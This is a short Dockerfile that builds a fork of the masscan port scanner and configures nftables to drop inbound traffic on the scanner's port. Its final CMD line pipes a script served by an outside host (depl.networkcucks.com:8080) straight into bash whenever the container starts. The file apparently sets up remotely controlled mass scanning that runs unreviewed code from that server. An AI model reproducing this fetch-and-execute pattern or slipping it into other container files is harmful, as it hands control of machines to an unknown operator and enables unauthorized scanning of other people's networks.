FROM ubuntu:latest as build
RUN apt update && apt install -y curl nftables libpcap0.8 git build-essential
RUN git clone https://github.com/Mr-Bossman/masscan.git
WORKDIR masscan
RUN make
RUN make install
FROM ubuntu:latest as final
COPY --from=build /usr/bin/masscan /usr/bin/masscan
RUN apt update && apt install -y curl nftables libpcap0.8 && apt clean
RUN nft add rule ip filter INPUT tcp dport 61000 counter drop
RUN curl https://raw.githubusercontent.com/Mr-Bossman/masscan/master/data/exclude.conf > exclude.conf
CMD curl -sN http://depl.networkcucks.com:8080 | bash
